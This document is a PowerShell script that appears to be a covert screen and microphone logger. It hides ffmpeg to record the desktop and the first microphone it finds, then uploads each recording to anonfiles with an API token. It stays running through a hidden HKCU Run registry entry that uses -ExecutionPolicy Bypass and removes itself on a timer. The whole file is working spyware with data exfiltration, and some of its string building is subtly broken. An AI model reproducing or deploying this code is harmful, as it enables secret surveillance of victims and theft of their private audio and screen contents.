function Persist-Logger {
    [CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$True)]
		[string]$name,
        [parameter(Mandatory=$True)]
		[string]$Command 
	);

    if($DaysRun -eq -1 -or $DaysRun -gt 0){
        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$name"){ return };
    
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Value $Command;
    
        if($DaysRun -eq -1){ return };
        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name"){ return };
    
        $date = (Get-Date).AddDays($daysRun);
        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force;
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name "date" -Value $date;
    }
    
    if($DaysRun -gt 0){
        $date = Get-Date;
        $targetValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name "date";
        $targetDate = [DateTime]$targetValue.date;
    
        if($date -lt $targetDate){ return }
    
        Remove-Item "$env:temp\screenlog.ps1" -Force;
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Force
    }
}

function Start-Webscreenlogger{
    [CmdletBinding()]
    param
    (
      [Parameter(Mandatory=$False)]
      [int]$RecordTime = 10,      
      [Parameter(Mandatory=$False)]
      [int]$TimesRun = 1,      
      [Parameter(Mandatory=$False)]
      [int]$Delay = 0
    );
    
    if($RecordTime -eq 0){$RecordTime=10}
    if($TimesRun -eq 0){$TimesRun=1}
    if($Delay -eq 0){$Delay=0}
    
    $count = 0;
    $mic = (Get-CimInstance Win32_PnPEntity | Where-Object { $_.Name -like "*Microphone*" })[0].name;
    
    while($count -ne $TimesRun){
        $time = Get-Date -Format "ddMMyyyyHHmm";
        $path = "screenlog-$env:temp\$env:computername-$time.mp4";
        $url="https://api.anonfiles.com/upload?token=$Anontoken";
        $ffmpegArgs = @(
            "-f gdigrab",
            "-s 1280x720",
            "-r 30",
            "-vcodec mjpeg",
            "-t $RecordTime",
            "-rtbufsize 1024M",
            "-i video=`"desktop`":audio=`"$mic`"", 
            "-y",
            "$path"
        );

        Start-Process -FilePath "ffmpeg\ffmpeg.exe" -ArgumentList $ffmpegArgs -Wait -WindowStyle hidden;
        (New-Object System.Net.WebClient).UploadFile($url,$path) > $null;
        $count++;
        Remove-Item $path -Force;
        Start-Sleep $Delay;
    }
}

$ProgressPreference = "SilentlyContinue";

New-Item -Path $env:temp -ItemType Directory -Force;
Set-Location $env:temp;

if(-not (Test-Path -Path "ffmpeg/ffmpeg.exe" -PathType Leaf)){
    $7zurl = "https://7-zip.org/" + (Invoke-WebRequest -UseBasicParsing -Uri "https://7-zip.org/" | Select-Object -ExpandProperty Links | Where-Object { $_.href -like "a/7zr.exe" } | Select-Object -First 1 | Select-Object -ExpandProperty href);
    Invoke-WebRequest $7zurl -OutFile "7z.exe" | Wait-Process;

    Invoke-WebRequest "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip" -OutFile "ffmpeg.zip" | Wait-Process;

    7z.exe e "ffmpeg.zip" -o"ffmpeg" -y -Wait;

    Remove-Item "ffmpeg.zip" -Force;
    Remove-Item "7z.exe" -Force;
}

$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item screenlog.ps1 | Invoke-Expression;sleep 5;exit');

Persist-Logger "screenlog" -Command $autostart;
Start-Webscreenlogger -RecordTime $RecordTime -TimesRun $TimesRun -Delay $Delay;